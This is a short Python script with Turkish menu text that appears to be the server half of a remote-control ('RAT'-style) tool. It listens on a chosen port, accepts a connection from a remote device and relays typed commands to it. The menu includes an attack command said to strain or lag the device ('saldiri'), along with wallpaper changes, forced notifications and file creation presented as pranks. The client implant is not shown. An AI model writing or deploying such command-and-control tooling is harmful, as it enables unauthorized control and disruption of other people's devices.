import socket

def komut_menusu():
    print("""
[ Komutlar ]
1. google            → Google aç
2. saldiri           → Cihazı kasar
3. dosya             → saka.txt oluştur
4. arkaplan <url>    → Arka plan değiştir
5. saka <mesaj>      → Bildirim şakası
6. exit              → Bağlantıyı kapat
""")

PORT = int(input("Port gir: "))

s = socket.socket()
s.bind(("0.0.0.0", PORT))
s.listen(1)
print(f"[✓] Dinleniyor: 0.0.0.0:{PORT}")

conn, addr = s.accept()
print(f"[+] Bağlantı geldi: {addr[0]}")

gelen = conn.recv(1024).decode()
print(gelen)

komut_menusu()

while True:
    komut = input("Komut >> ").strip()
    if komut == "":
        continue
    try:
        conn.send(komut.encode())
        if komut == "exit":
            print("[✓] Bağlantı kapatıldı.")
            break
        cevap = conn.recv(2048).decode()
        print(cevap)
    except:
        print("[!] Cevap alınamadı veya bağlantı kesildi.")
        break

conn.close()
